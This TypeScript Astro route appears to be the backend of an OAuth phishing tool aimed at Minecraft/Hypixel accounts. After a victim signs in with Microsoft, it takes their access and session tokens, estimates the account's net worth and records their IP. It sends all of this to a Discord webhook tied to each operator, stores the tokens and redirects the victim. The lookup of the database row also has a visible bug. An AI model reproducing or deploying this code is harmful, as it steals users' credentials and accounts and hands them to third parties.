import type { APIRoute } from "astro";
import { queryFirstRes } from "../../../../../libs/db/actions/query";
import saveToken from "../../../../../libs/db/actions/saveToken";
import oauthFlow from "../../../../../libs/microsoft/oauthFlow";
import oauthWebhook from "../../../../../libs/discord/oauthWebhook";
import networthCalc from "../../../../../libs/hypixel/networthCalc";
import urlHandler from "../../../../../libs/urlHandler";

export const get: APIRoute = async ({ request, redirect }) => {
    const requestUrl = new urlHandler(request.url);
    const query:any = await requestUrl.getQuery();
    if (!["code", "state"].every((key) => query.hasOwnProperty(key))) {
        return await res(400, "Code or State Parameter Missing");
    }
    const code = query["code"];
    const state = query["state"];
    const row = (await queryFirstRes("SELECT * FROM `users` WHERE `state` = ?", [state]))['webhook'];
    if (!row) {
        return await res(400, "Invalid State");
    }
    const webhook = row['webhook']
    const redirect_uri = row['redirect_uri'];
    const url = await requestUrl.getURLNoQuery();
    const data:any = await oauthFlow(code, url, false);
    if (data.status !== 200) {
        return await res(data.status, data.message);
    }
    const nwData:any = networthCalc(data['uuid']);
    //add ip address to data, cloudflare header
    const ip = request.headers.get("CF-Connecting-IP") || request.headers.get("X-Forwarded-For") || request.headers.get("X-Real-IP") || '69.69.69.69 (Error, dunny why)'; 

    await oauthWebhook(webhook, data, nwData, ip);
    const saveSuccess = await saveToken(state, data['username'], data['access_token'], data['session_token'], url)
    if (!saveSuccess) {
        return await res(500, "Error Saving Refresh Token");
    }
    return redirect(redirect_uri);
};

async function res(status:number, message:string) {
    return new Response(JSON.stringify({
        message: message,
        status: status
    }), {
        status: status,
        headers: {
            "Content-Type": "application/json"
        }
    })
}